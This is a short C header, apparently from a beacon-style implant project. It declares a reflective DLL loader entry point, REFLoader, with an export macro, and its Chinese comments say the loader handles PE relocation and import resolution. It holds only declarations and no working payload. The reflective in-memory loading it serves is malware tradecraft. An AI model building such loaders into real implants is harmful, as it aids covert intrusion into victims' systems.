#pragma once

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#ifndef NOMINMAX
#define NOMINMAX
#endif

#include <windows.h>

/* DLL 构建时导出反射加载函数，EXE 构建时不导出 */
#if !defined(BEACON_DLL_BUILD)
#define BEACON_REFLECTIVE_EXPORT
#elif defined(_M_IX86)
#define BEACON_REFLECTIVE_EXPORT
#else
#define BEACON_REFLECTIVE_EXPORT __declspec(dllexport)
#endif

#ifdef __cplusplus
extern "C" {
#endif

/*
 * 反射式加载器入口点。
 * 在 DLL 被反射加载时调用，完成 PE 重定位、导入表解析等初始化。
 */
BEACON_REFLECTIVE_EXPORT ULONG_PTR WINAPI REFLoader(LPVOID lpParameter);

#ifdef __cplusplus
}
#endif
